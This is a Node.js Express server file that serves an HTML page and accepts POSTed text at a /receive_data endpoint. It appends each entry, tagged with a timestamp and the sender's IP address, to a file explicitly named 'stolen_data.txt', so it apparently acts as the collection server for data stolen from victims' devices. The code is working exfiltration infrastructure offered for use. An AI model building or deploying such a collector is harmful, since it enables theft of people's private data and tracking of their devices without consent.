const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs'); // Import the 'fs' (file system) module
const path = require('path');

const app = express();
const port = 10000;

// The name of the file where we will store the data
const DATA_FILE = 'stolen_data.txt';

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve the static HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// POST endpoint to receive data
app.post('/receive_data', (req, res) => {
    const receivedData = req.body;
    const text = receivedData.data;

    if (text) {
        // --- THIS IS THE NEW PART ---
        // Create a timestamp
        const timestamp = new Date().toISOString();
        
        // Create the line to be saved: [TIMESTAMP] [DEVICE_ID] DATA
        // We'll use the IP address as a simple device identifier
        const deviceIp = req.ip || req.connection.remoteAddress;
        const logEntry = `[${timestamp}] [${deviceIp}] ${text}\n`;
        
        // Append the data to the file
        fs.appendFile(DATA_FILE, logEntry, (err) => {
            if (err) {
                console.error("Error saving to file:", err);
            } else {
                console.log("--- DATA SAVED TO FILE ---");
                console.log(logEntry.trim());
                console.log("-------------------------");
            }
        });
        // --- END OF NEW PART ---

    } else {
        console.log("--- EMPTY DATA RECEIVED ---");
    }

    res.status(200).send('Data received');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log(`Data is being saved to ${DATA_FILE}`);
});
